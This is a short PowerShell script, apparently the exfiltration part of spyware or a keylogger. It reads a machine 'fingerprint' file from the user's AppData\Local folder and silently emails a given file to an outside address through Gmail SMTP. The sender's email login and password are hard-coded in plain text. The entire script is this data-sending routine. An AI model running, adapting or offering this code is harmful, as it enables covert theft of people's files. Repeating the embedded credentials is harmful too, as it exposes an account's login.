param($attachment)
if( (Test-Path $attachment) ){
    $pwd =  "$home\AppData\Local"
    cd $pwd
    $EmailTo = "commnc@krutt.org"
    $EmailFrom = "templeynonso@gmail.com"
    $Subject = "Report from "+(get-content "$pwd\fingerprint")
    $Body = "Report from "+(get-content "$pwd\fingerprint")+" attached herein."
    $SMTPServer = "smtp.gmail.com" 
    $filenameAndPath = $attachment
    $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
    $attachment = New-Object System.Net.Mail.Attachment($filenameAndPath)
    $SMTPMessage.Attachments.Add($attachment)
    $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
    $SMTPClient.EnableSsl = $true 
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("templeynonso@gmail.com", "oguezuonu")
    $SMTPClient.Send($SMTPMessage)
 }
